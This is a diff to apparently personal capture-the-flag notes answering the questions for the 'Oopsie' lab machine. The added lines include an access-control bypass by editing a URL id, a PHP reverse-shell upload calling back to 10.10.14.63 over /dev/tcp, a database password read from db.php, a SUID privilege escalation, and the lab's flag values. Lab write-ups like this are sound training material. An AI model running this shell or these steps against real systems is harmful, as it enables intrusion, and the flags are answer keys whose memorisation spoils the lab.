@@ -741,26 +741,45 @@ Submit root flag: b91ccec3305e98240082d4474b848528.
 
 ### Oopsie `r fa("linux")`
 
-With what kind of tool can intercept web traffic?
+* With what kind of tool can intercept web traffic? proxy.
 
-What is the path to the directory on the webserver that returns a login page?
+* What is the path to the directory on the webserver that returns a login page? `/cdn-cgi/login`.
 
-What can be modified in Firefox to get access to the upload page?
+* What can be modified in Firefox to get access to the upload page? cookie.
 
-What is the access ID of the admin user?
+* What is the access ID of the admin user? 34322. The `id` URL parameter was `2`. Change it to `id=1`:
+```{bash eval=F}
+http://10.129.210.215/cdn-cgi/login/admin.php?content=accounts&id=1
+```
 
-On uploading a file, what directory does that file appear in on the server?
+Upload a `shell.php` to the webserver:
+```{php eval=F}
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.63/4242 0>&1'");?>
+```
 
-What is the file that contains the password that is shared with the robert user?
+* On uploading a file, what directory does that file appear in on the server? `/uploads`.
 
-What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
+* What is the file that contains the password that is shared with the robert user? `db.php`.
+```{php eval=F}
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+```
 
-Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
+The string `M3g4C0rpUs3r!` is the password for the `robert` user on the server.
 
-What SUID stands for?
+* What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? `find / -group bugtracker 2>/dev/null`.
 
-What is the name of the executable being called in an insecure manner?
+* Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? `root`.
 
-Submit user flag:
+* What SUID stands for? `set owner user id`.
 
-Submit root flag:
+Execute `ltrace ./bugtracker` to see what it does.
+
+* What is the name of the executable being called in an insecure manner? `cat`.
+
+Provide `../root.txt` as the Bug ID and we obtain the flag.
+
+* Submit user flag: `f2c74ee8db7983851ab2a96a44eb7981`.
+
+* Submit root flag: `af13b0bee69f8a877c3faf667f7beacf`.
